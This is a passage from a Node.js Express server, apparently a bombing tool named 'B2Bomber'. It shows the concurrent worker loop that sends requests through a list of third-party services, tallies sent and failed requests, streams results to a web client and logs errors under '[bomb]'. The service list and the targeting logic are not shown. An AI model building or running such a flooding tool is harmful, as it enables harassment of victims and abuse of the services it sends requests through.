        if (Date.now() - startedAt > MAX_RUN_MS) return;
        const i = cursor++;
        if (i >= tasks.length) return;
        const svc = tasks[i];

        let r;
        try { r = await sendOne(svc, ctx); }
        catch (e) { r = { ok: false, status: 0, ms: 0, url: '', snippet: '', why: e?.message || 'err' }; }
        if (closed) return;

        note(svc, r.ok, r.status, r.ms);
        done++; r.ok ? sent++ : failed++;

        emit({
          type: 'result', done, sent, failed, id: svc.id, name: svc.name,
          status: r.status, ms: r.ms, ok: r.ok, error: r.why, snippet: r.snippet, url: r.url,
        });
        if (STAGGER_MS) await sleep(STAGGER_MS);
      }
    };

    try { await Promise.all(Array.from({ length: Math.min(CONCURRENCY, tasks.length) }, worker)); }
    catch (e) { emit({ type: 'error', error: e?.message }); }

    finish({ type: 'done', sent, failed, total, done });
  } catch (e) {
    console.error('[bomb]', e);
    if (!res.headersSent) res.status(500).json({ error: e?.message });
    else { try { res.write(JSON.stringify({ type: 'error', error: e?.message }) + '\n'); res.end(); } catch {} }
  }
});

app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/favicon.ico', (_req, res) => res.status(204).end());
app.use((err, _req, res, _next) => { console.error('[error]', err); if (!res.headersSent) res.status(500).json({ error: err?.message }); });

const server = app.listen(PORT, HOST, () => {
  console.log(`B2Bomber up :${PORT} | ${SERVICES.length} services | node ${process.version}`);
});
server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;
server.requestTimeout = 0;
server.timeout = 0;

export default app;
